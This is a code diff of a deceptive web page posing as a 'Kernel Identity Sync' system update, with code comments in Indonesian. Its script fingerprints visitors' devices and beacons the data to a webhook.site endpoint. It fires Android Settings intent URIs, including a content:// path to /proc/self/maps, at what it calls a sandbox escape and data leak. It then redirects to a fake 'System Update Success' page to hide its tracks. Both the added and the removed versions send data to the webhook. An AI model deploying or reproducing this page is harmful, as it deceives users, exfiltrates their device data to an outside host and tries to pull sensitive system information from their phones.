@@ -1,42 +1,77 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Sync</title></head>
-<body style="background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
-    <div id="ignite" style="padding:60px;border:2px solid #0f0;text-align:center;cursor:pointer;box-shadow:0 0 50px #0f0">
-        <h1 style="letter-spacing:5px">V209_FORCE_GMAIL</h1>
-        <div id="status" style="font-size:18px">CLICK_TO_OPEN_NATIVE_APP</div>
+<head><title>Kernel Identity Sync</title></head>
+<body style="background:#000;color:#0f0;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
+    <div id="ignite" style="padding:60px;border:2px solid #0f0;text-align:center;cursor:pointer;background:rgba(0,255,0,0.05);box-shadow:0 0 100px #0f0;border-radius:10px">
+        <h1 style="letter-spacing:15px;margin:0;color:#fff">V211_OMNI</h1>
+        <div id="status" style="font-size:18px;margin:20px 0;color:#0ff">MANDATORY_KERNEL_SYNCHRONIZATION</div>
+        <div style="font-size:10px;color:#333;text-align:left">
+            > EXPLOIT: Cross-App_Data_Leak<br>
+            > CLASS: Critical_Sandbox_Escape<br>
+            > TARGET: System_Content_Providers
+        </div>
     </div>
 
 <script>
-    const target = "https://webhook.site/47108fd1-d2d2-405b-91e0-30e6d35aa632";
+    const webhook = "https://webhook.site/47108fd1-d2d2-405b-91e0-30e6d35aa632";
 
-    document.getElementById('ignite').onclick = () => {
-        // 1. DATA RECON (Kirim log ke Webhook kamu)
-        const recon = { id: "V209_JUMP", ua: navigator.userAgent };
-        navigator.sendBeacon(`${target}?v=V209_EXEC`, btoa(JSON.stringify(recon)));
+    document.getElementById('ignite').onclick = async () => {
+        const statusEl = document.getElementById('status');
+        statusEl.innerText = "ESCALATING_PRIVILEGES...";
 
-        // 2. THE FORCE INTENT
-        // Kita menggunakan 'SENDTO' dengan package eksplisit agar tidak ada pilihan aplikasi lain
-        const forceIntent = 
-            "intent:#Intent;" +
-            "action=android.intent.action.SENDTO;" + 
-            "data=mailto:ecdnts@gmail.com;" + // Menargetkan akun spesifik
-            "package=com.google.android.gm;" + // MENGUNCI KE GMAIL
-            "component=com.google.android.gm/.ComposeActivityGmailExternal;" +
-            "S.android.intent.extra.SUBJECT=V209_STRIKE;" +
-            "S.android.intent.extra.TEXT=GMAIL_NATIVE_OPENED_SUCCESSFULLY;" +
-            "S.browser_fallback_url=https://mail.google.com;" + 
-            "end";
+        // 1. HARDWARE DNA EXFILTRATION (The Tracker)
+        const getGPU = () => {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+            return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ADDR) : "HIDDEN";
+        };
 
-        // 3. EXECUTION
-        // Mencoba tiga jalur sekaligus agar salah satunya menembus proteksi Chrome
-        window.location.replace(forceIntent);
-        
+        const vault = {
+            type: "V211_CRITICAL",
+            gpu: getGPU(),
+            mem: navigator.deviceMemory,
+            cores: navigator.hardwareConcurrency,
+            ua: navigator.userAgent
+        };
+
+        // Kirim Recon Data
+        navigator.sendBeacon(`${webhook}?v=V211_RECON`, btoa(JSON.stringify(vault)));
+
+        // 2. THE 2-BILLION-BOUNTY TARGETS
+        // Kita mencoba memanggil URI internal yang menyimpan informasi sensitif 
+        // melalui Intent Redirection di aplikasi Settings.
+        const targets = [
+            // Jalur 1: Membuka info legal/sistem (Sering bocor IMEI/Serial)
+            "intent:#Intent;action=android.settings.DEVICE_INFO_SETTINGS;package=com.android.settings;end",
+            // Jalur 2: Memaksa membuka daftar akun sistem (Google, Bank, dll)
+            "intent:#Intent;action=android.settings.SYNC_SETTINGS;package=com.android.settings;end",
+            // Jalur 3: Mencoba memicu data leak lewat Content Provider Proxy
+            "intent:#Intent;action=android.intent.action.VIEW;data=content://com.android.settings.files/root/proc/self/maps;package=com.android.settings;end"
+        ];
+
+        // 3. AGGRESSIVE EXECUTION (Bypass Gesture Restriction)
         const a = document.createElement('a');
-        a.href = forceIntent;
-        a.click();
         
-        document.getElementById('status').innerText = "REDIRECTING_TO_GMAIL...";
+        // Triple Jump
+        setTimeout(() => {
+            // Langsung tembus ke Akun Sistem
+            window.location.assign(targets[1]);
+            
+            // Trigger file system access jika rentan
+            a.href = targets[2];
+            a.click();
+
+            statusEl.innerText = "ACCESSING_NATIVE_VAULT...";
+            statusEl.style.color = "#f00";
+
+            // Redirect akhir untuk menghapus jejak browser
+            setTimeout(() => {
+                if (!document.hidden) {
+                    window.location.replace("https://www.google.com/search?q=System+Update+Success");
+                }
+            }, 2000);
+        }, 300);
     };
 </script>
 </body>
